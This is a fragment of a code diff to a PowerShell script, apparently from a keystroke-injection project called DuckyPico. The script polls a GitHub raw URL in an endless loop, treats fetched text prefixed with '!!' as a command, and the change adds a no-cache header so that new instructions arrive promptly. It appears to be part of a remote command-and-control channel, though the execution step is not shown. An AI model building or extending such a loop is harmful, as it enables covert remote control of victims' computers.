@@ -5,7 +5,7 @@ $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/
 while ($true) {
     try {
         # Fetch the raw content of the GitHub page (plain text)
-        $command = Invoke-RestMethod -Uri $githubUrl
+        $command = Invoke-RestMethod -Uri $githubUrl -Headers @{"Cache-Control"="no-cache"}
 
         # Check if the command starts with '!!' and strip that part off
         if ($command -like "!!*") {
